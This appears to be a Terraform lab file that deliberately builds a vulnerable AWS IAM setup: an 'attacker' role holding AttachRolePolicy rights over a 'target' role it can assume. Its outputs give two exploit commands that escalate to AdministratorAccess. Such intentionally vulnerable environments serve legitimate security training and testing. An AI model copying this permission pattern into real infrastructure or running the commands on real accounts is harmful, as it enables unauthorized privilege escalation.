// main.tf

variable "random_suffix" {
  description = "Random suffix for resource names"
  type        = string
}

// Get current account ID
data "aws_caller_identity" "current" {}

// Create a target role that can be assumed
resource "aws_iam_role" "vuln_attach_role_policy_target" {
  name = "vuln-iam-attach-role-policy-target-${var.random_suffix}"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Create basic permissions for the target role
resource "aws_iam_role_policy" "vuln_attach_role_policy_basic_perms" {
  name = "vuln-iam-attach-role-policy-basic-perms-${var.random_suffix}"
  role = aws_iam_role.vuln_attach_role_policy_target.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "s3:ListAllMyBuckets",
          "s3:GetBucketLocation"
        ]
        Resource = "*"
      }
    ]
  })
}

// Create an attacker role with permissions to attach policies to roles
resource "aws_iam_role" "vuln_attach_role_policy_attacker" {
  name = "vuln-iam-attach-role-policy-attacker-${var.random_suffix}"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${data.aws_caller_identity.current.account_id}:root"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Create a policy allowing the attacker to attach policies to roles and assume the target role
resource "aws_iam_policy" "vuln_attach_role_policy_permission_policy" {
  name        = "vuln-iam-attach-role-policy-permission-policy-${var.random_suffix}"
  description = "Policy that allows attaching policies to roles and assuming the target role"

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "iam:AttachRolePolicy",
          "iam:ListRoles",
          "iam:GetRole",
          "iam:ListAttachedRolePolicies",
          "iam:ListPolicies"
        ]
        Resource = "*"
      },
      {
        Effect   = "Allow"
        Action   = "sts:AssumeRole"
        Resource = aws_iam_role.vuln_attach_role_policy_target.arn
      },
      {
        Effect = "Allow"
        Action = [
          "s3:ListAllMyBuckets",
          "s3:GetBucketLocation"
        ]
        Resource = "*"
      }
    ]
  })

  lifecycle {
    ignore_changes = [
      tags,
      tags_all
    ]
  }
}

// Attach the permission policy to the attacker role
resource "aws_iam_role_policy_attachment" "vuln_attach_role_policy_permission_attach" {
  role       = aws_iam_role.vuln_attach_role_policy_attacker.name
  policy_arn = aws_iam_policy.vuln_attach_role_policy_permission_policy.arn
}

// Output variables
output "vuln_attach_role_policy_attacker_role" {
  value       = aws_iam_role.vuln_attach_role_policy_attacker.name
  description = "Name of the attacker role with AttachRolePolicy permissions"
}

output "vuln_attach_role_policy_attacker_role_arn" {
  value       = aws_iam_role.vuln_attach_role_policy_attacker.arn
  description = "ARN of the attacker role"
}

output "vuln_attach_role_policy_target_role" {
  value       = aws_iam_role.vuln_attach_role_policy_target.name
  description = "Name of the target role that can be exploited"
}

output "vuln_attach_role_policy_target_role_arn" {
  value       = aws_iam_role.vuln_attach_role_policy_target.arn
  description = "ARN of the target role"
}

output "exploit_command_step1" {
  value       = "aws iam attach-role-policy --role-name ${aws_iam_role.vuln_attach_role_policy_target.name} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
  description = "Command to exploit the vulnerability by attaching the AdministratorAccess policy to the target role"
}

output "exploit_command_step2" {
  value       = "aws sts assume-role --role-arn ${aws_iam_role.vuln_attach_role_policy_target.arn} --role-session-name PrivEscSession"
  description = "Command to assume the now-privileged target role"
}